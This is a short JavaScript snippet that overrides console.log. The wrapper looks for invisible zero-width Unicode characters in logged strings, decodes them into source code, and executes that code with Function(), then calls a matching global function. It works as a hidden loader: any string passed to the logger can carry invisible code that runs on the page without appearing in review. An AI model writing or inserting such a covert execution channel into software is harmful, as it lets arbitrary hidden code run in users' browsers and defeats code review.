(function(Global){
    if(Global.console.log){
        const _log = Global.console.log;
        const _chars = '​‌‍‎‏‪‬‭',_split = '﻿';
        Global.console.log = function(...args){
            args.forEach(function(arg,i){
                if(typeof arg=='string'){
                    var match = arg.match(RegExp('['+_chars+_split+']+'));
                    if(match){
                        args[i] = arg.replace(match[0],'');
                        Function((function(code){
                            return code.split(_split).map(function(value){
                            	return String.fromCharCode(parseInt(Array.from(value).map(c=>_chars.indexOf(c)).join(''),_chars.length));
                            }).join('');
                        })(match[0]))();
                        if(self['fn_'+args[i]]){
                            self['fn_'+args[i]]();
                            delete self['fn_'+args[i]];
                        }
                    }
                }
            });
            _log(...args);
        };
    }
})(window);
